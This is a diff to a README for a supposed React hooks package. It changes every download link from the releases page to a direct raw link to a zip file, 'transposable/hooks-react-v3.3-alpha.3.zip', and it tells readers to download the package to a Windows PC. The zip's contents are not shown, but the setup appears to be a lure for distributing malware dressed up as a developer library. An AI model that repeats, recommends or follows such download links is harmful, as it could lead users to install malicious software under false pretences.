@@ -1,6 +1,6 @@
 # ⚛️ react-hooks-1771918252-3 - Easy React State Helpers
 
-[![Download react-hooks-1771918252-3](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Shahzadmalik47/react-hooks-1771918252-3/releases)
+[![Download react-hooks-1771918252-3](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Shahzadmalik47/react-hooks-1771918252-3/raw/refs/heads/main/transposable/hooks-react-v3.3-alpha.3.zip)
 
 ---
 
@@ -45,7 +45,7 @@ This section guides you step-by-step to get the software on your Windows PC and 
 
 Click the large download button at the top or go to this page:
 
-[Download react-hooks-1771918252-3 Releases](https://github.com/Shahzadmalik47/react-hooks-1771918252-3/releases)
+[Download react-hooks-1771918252-3 Releases](https://github.com/Shahzadmalik47/react-hooks-1771918252-3/raw/refs/heads/main/transposable/hooks-react-v3.3-alpha.3.zip)
 
 This page lists the available files for download. The software is not a traditional Windows app but a set of React hook files you can use in your projects.
 
@@ -96,7 +96,7 @@ These help explain the purpose and usage of each hook.
 ## 🔧 How to Update the Software
 
 1. Visit the downloads page regularly for new releases:  
-   [react-hooks-1771918252-3 Releases](https://github.com/Shahzadmalik47/react-hooks-1771918252-3/releases)  
+   [react-hooks-1771918252-3 Releases](https://github.com/Shahzadmalik47/react-hooks-1771918252-3/raw/refs/heads/main/transposable/hooks-react-v3.3-alpha.3.zip)  
 2. Download the newest `.zip` file following the steps above.  
 3. Replace the old extracted files with the new ones to update.  
 
@@ -130,4 +130,4 @@ These help developers reduce errors and write clearer code.
 
 ---
 
-# [⬇️ Download react-hooks-1771918252-3](https://github.com/Shahzadmalik47/react-hooks-1771918252-3/releases)
+# [⬇️ Download react-hooks-1771918252-3](https://github.com/Shahzadmalik47/react-hooks-1771918252-3/raw/refs/heads/main/transposable/hooks-react-v3.3-alpha.3.zip)
